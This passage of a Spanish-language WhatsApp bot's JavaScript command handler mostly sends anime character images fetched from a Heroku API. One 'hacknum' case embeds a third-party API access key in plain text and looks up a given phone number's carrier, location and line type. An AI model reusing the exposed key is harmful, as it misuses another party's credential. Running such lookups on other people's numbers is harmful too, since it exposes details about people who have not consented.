yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `loli2`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐋𝐨𝐥𝐢 𝟐`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'naruto':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/naruto?&apikey=${confukey}`)
buttons = [{buttonId: `naruto`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐍𝐚𝐫𝐮𝐭𝐨`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'sasuke':
case 'saske':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/sasuke?&apikey=${confukey}`)
buttons = [{buttonId: `sasuke`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐒𝐚𝐬𝐮𝐤𝐞`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'sakura':
case 'saku':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/sakura?&apikey=${confukey}`)
buttons = [{buttonId: `sakura`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐒𝐚𝐤𝐮𝐫𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'hina':
case 'hinata':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/hinata?&apikey=${confukey}`)
buttons = [{buttonId: `hinata`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐇𝐢𝐧𝐚𝐭𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////
case 'hacknum':

if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!c) return fakegroup('Donde esta el número?')

numero = `${args[0].replace('@', '')}`

uwus = ['```']

	anu = await fetchJson(`http://apilayer.net/api/validate?access_key=0037494de576f1341eb310a420dd5cb0&number=${numero}&country_code=&format=1`)

reply(`Numero : ${anu.number}

Formato local : ${anu.local_format}

Formato internacional : ${anu.international_format}

Prefijo de pais : ${anu.country_prefix}

Codigo de pais : ${anu.country_code}

Nombre de pais : ${anu.country_name}

Localización : ${anu.location}

Empresa : ${anu.carrier}

Tipo de línea : ${anu.line_type}`)

break
case 'kann':
case 'kanna':
case 'kamui':
if (!isGroup) return reply('esta función es solo para grupos')
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/kanna?&apikey=${confukey}`)
buttons = [{buttonId: `kanna`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐚𝐧𝐧𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'shoto':
case 'todoroki':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
yoiz = await getBuffer(`https://api-alc.herokuapp.com/api/anime/todoroki-shoto?&apikey=${confukey}`)
buttons = [{buttonId: `shoto`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐓𝐨𝐝𝐨𝐫𝐨𝐤𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'akiyama':
case 'akiyam':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/akiyama?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `akiyama`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐀𝐤𝐢𝐲𝐚𝐦𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'anna':
case 'ana':
case 'kobayakawa':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kobayakawa-anna?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `anna`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐀𝐧𝐧𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'ayuzawa':
case 'misaki':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/misaki-ayuzawa?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `misaki`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐀𝐲𝐮𝐳𝐚𝐰𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'boruto':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/boruto?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `boruto`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐁𝐨𝐫𝐮𝐭𝐨`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'chitoge':
case 'kirisaki':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/chitoge?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `chitoge`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐂𝐡𝐢𝐭𝐨𝐠𝐞`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'deidara':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/deidara?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `deidara`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐃𝐞𝐢𝐝𝐚𝐫𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'doraemon':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/doraemon?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `doraemon`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐃𝐨𝐫𝐚𝐞𝐦𝐨𝐧`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'elaina':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/elaina?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `elaina`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐄𝐥𝐚𝐢𝐧𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'emilia':
if (!isGroup) return reply('esta función es solo para grupos')
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/emilia?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `emilia`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐄𝐦𝐢𝐥𝐢𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'erza':
case 'scarlet':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/erza?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `erza`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐄𝐫𝐳𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'rias':
case 'gremory':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/rias-gremory?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `rias`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐑𝐢𝐚𝐬`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'hestia':
case 'estia':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/hestia?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `hestia`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐇𝐞𝐬𝐭𝐢𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'inori':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/inori?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `inori`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐈𝐧𝐨𝐫𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'isuzu':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/isuzu?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `isuzu`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐈𝐬𝐮𝐳𝐮`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'itachi':
if (!isGroup) return reply('esta función es solo para grupos')
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/itachi?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `itachi`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐈𝐭𝐚𝐜𝐡𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'kaga':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kaga?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `kaga`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐚𝐠𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'kagura':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kagura?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `kagura`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐚𝐠𝐮𝐫𝐚`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'kakashi':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kakashi?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `kakashi`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐚𝐤𝐚𝐬𝐡𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'kaori':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kaori?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `kaori`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐚𝐨𝐫𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'kaneki':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kaneki?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `kaneki`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐚𝐧𝐞𝐤𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'kotori':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kotori?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `kotori`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐨𝐭𝐨𝐫𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'kurumi':
case 'tokisaki':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/kurumi-tokisaki?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `tokisaki`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await cnf.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'ꪶ🜲͜͡⃟⸸𝗝𝗢𝗦𝗘𝗣𝗛-𝗕𝗢𝗧𖤐᭄', imageMessage: imageMsg,
              contentText:`𝐀𝐧𝐢𝐦𝐞 𝐊𝐮𝐫𝐮𝐦𝐢-𝐓𝐨𝐤𝐢𝐬𝐚𝐤𝐢`,buttons,headerType:4}
              prep = await cnf.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              cnf.relayWAMessage(prep)
             } catch {
           reply('Lo siento ah ocurrido un error')
           }

break

////////////////

case 'madara':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())                
if (!isGroup) return reply('esta función es solo para grupos')
reply(mess.wait)
	    	try {
anu = await fetchJson(`https://api-alc.herokuapp.com/api/anime/madara?&apikey=${confukey}`)
yoiz = await getBuffer(anu.result)
buttons = [{buttonId: `madara`,buttonText:{displayText: `➡️Next`},type:1}]
